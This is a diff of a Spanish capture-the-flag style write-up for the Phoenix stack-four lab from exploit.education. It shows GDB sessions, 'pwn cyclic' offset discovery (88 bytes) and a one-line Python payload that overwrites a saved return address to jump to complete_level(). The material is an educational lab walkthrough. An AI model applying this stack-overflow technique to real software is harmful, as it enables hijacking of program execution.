@@ -20,7 +20,7 @@ El objetivo es modificar la dirección de retorno de la función `start_level()`
 **Consejos:**
 
 - El puntero de instrucción guardado no necesariamente se encuentra justo después de las variables locales: factores como el **relleno del compilador** pueden modificar su ubicación.  
-- Algunas arquitecturas pueden no guardar la dirección de retorno en la pila en todos los casos. Más info: [Link register](https://en.wikipedia.org/wiki/Link_register).  
+- Algunas arquitecturas pueden no guardar la dirección de retorno en la pila en todos los casos. Más info: [Link register](https://en.wikipedia.org/wiki/Link_register){:target="_blank"}.  
 - GDB permite redirigir la entrada de un archivo con `run < my_file`
 
 ## Análisis del código
@@ -90,7 +90,7 @@ int main(int argc, char **argv) {
 }
 ```
 
-El reto consiste en sobrescribir la dirección de retorno de start_level() para redirigir la ejecución hacia complete_level().
+El reto consiste en sobrescribir la dirección de retorno de **start_level()** para redirigir la ejecución hacia **complete_level()**
 
 
 ```c
@@ -140,7 +140,7 @@ gef➤
 
 **Determinación de offset con cyclic**
 
-Hacemos un breakpoint en main y ejecutamos el programa: para esto ejecutamos los comandos `break main` y luego el comando `r` para ejecutarlo
+Hacemos un breakpoint en main y ejecutamos el programa: para esto ejecutamos los comandos `break main` y luego el comando `r` para iniciarlo, esto nos muestra información del binario y nos dice donde estamos.
 
 ```c
 gef➤  break main
@@ -197,7 +197,7 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 gef➤ 
 ```
 
-Ejecutamos el comando `c` para continuar 
+para continuar con la ejecución del binario lo hacemos con el comando `c` esto nos permite continuar y vemos que nos pide el argumento
 
 ```c
 gef➤  c
@@ -205,7 +205,7 @@ Continuing.
 Welcome to phoenix/stack-four, brought to you by https://exploit.education
 ```
 
-Enviamos un patrón cíclico de 100 bytes: con el comando `pwn cyclic 100` en nuestra máquina local
+vamos a crear un patrón  cíclico de 100 bytes: con la herramienta de pwn cyclic y esto lo hacemos con el comando `pwn cyclic 100` en nuestra máquina local y nos envía un patrón de 100 caracteres
 
 ```c
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix]
@@ -213,7 +213,7 @@ Enviamos un patrón cíclico de 100 bytes: con el comando `pwn cyclic 100` en nu
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
 ```
 
-El resultado que nos da lo pegamos como la respuesta que está esperando el binario 
+Este patrón lo copiamos y lo pegamos como la respuesta que está esperando el binario y vemos que nos da un mensaje que dice **y volverá a 0x6161617861616177** ya tenemos el retorno pisado, pero aún no sabemos el offset 
 
 ```c
 gef➤  c
@@ -264,7 +264,7 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 gef➤  
 ```
 
-con el comando `info frame` podemos ver el valor del rip que en este caso es  rip = 0x6161617861616177
+con el comando `info frame` podemos confirmar esto y ver el valor del rip que en este caso es  **rip = 0x6161617861616177** el mismo que nos devuelve el binario
 
 ```c
 gef➤  info frame
@@ -279,7 +279,7 @@ Stack level 0, frame at 0x7fffffffe648:
 ```
 
 
-Calculamos el offset donde se sobrescribe el saved return address con el valor que tenemos  
+para calcular el offset donde se sobrescribe el **saved return address** vamos a hacer nuevamente de la herramienta pwn cyclic con el valor que tenemos, lo realizamos con el comando `pwn cyclic -l 0x6161617861616177` y vemos que nos responde 88, es decir, debemos enviar 88 bytes antes de la dirección de **complete_level()**
 
 ```c
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix]
@@ -287,9 +287,7 @@ Calculamos el offset donde se sobrescribe el saved return address con el valor q
 88
 ```
 
-El offset es 88 bytes, es decir, debemos enviar 88 bytes antes de la dirección de complete_level(). 
-
-enviamos el payload y la dirección de complet_level que vimos previamente  **0x000000000040061d  complete_level** pero en little-endian que sería \x1d\x06\x40 y con esto resolvemos el reto.
+enviamos el payload y la dirección de complet_level que vimos previamente  **0x000000000040061d  complete_level** pero en little-endian que sería **\x1d\x06\x40** y con esto resolvemos el reto.
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print "A" * 88 + "\x1d\x06\x40"' | ./stack-four 
